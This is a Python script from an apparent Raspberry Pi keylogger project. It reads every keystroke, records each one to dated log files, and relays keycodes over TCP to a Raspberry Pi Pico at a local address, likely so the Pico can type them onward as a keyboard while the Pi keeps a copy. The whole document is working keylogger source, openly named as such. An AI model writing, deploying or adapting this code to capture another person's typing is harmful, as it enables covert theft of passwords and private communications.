import getch
import socket
import time

def log(char, date):
    """Log keypresses to a file and send them over TCP."""
    print(f"Logging and sending keycode {ord(char)}")
    send_key(char)
    
    if ord(char) == 5:
        exit()
    elif ord(char) == 13:
        char = "\n"
    elif ord(char) == 127:
        char = "<Backspace>"
    elif ord(char) == 218:
        char = "<Up>"
    elif ord(char) == 217:
        char = "<Down>"
    elif ord(char) == 216:
        char = "<Left>"
    elif ord(char) == 215:
        char = "<Right>"

    with open(f"/home/rikka/Pi-Keylogger/log/{date}.txt", "a+") as f:
        f.write(char)

def arrow(char):
    """Convert arrow key escape sequences to keycodes."""
    if ord(char) == 65:
        return 218  # Up Arrow
    elif ord(char) == 67:
        return 215  # Right Arrow
    elif ord(char) == 68:
        return 216  # Left Arrow
    elif ord(char) == 66:
        return 217  # Down Arrow
    else:
        return 0

PICO_IP = "192.168.36.30"  # Change if needed
PORT = 12345
sock = None  # Declare socket globally

def connect():
    """Try to establish a TCP connection to the Pico."""
    global sock
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)  # Prevents long blocking
            sock.connect((PICO_IP, PORT))
            print(f"Connected to {PICO_IP}:{PORT}")
            return
        except Exception as e:
            print(f"Failed to connect: {e}, retrying in 2s...")
            time.sleep(2)

connect()  # Establish initial connection

def send_key(char):
    """Send a keypress to the Pico via TCP."""
    global sock
    try:
        sock.sendall(f"{ord(char)}\n".encode())  # Send keycode as raw data
    except Exception as e:
        print(f"Error sending key {ord(char)}: {e}")
        sock.close()
        sock = None
        connect()  # Reconnect if broken

date = time.strftime("%c").replace(" ", "-")
print(date)

with open(f"/home/rikka/Pi-Keylogger/log/{date}.txt", "w+") as f:
    f.write(f"Started at {date}\n")

print("Keylogger started!")

while True:
    try:
        char = getch.getch()
        if ord(char) == 27:  # Escape sequence (arrow keys, etc.)
            _char = getch.getch()
            if ord(_char) == 91:  # Arrow key indicator
                char = chr(arrow(getch.getch()))
                log(char, date)
            else:
                log(char, date)
                log(_char, date)
        else:
            log(char, date)
    except KeyboardInterrupt:
        print("Exiting...")
        log(chr(3), date)
        break
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(0.1)

sock.close()
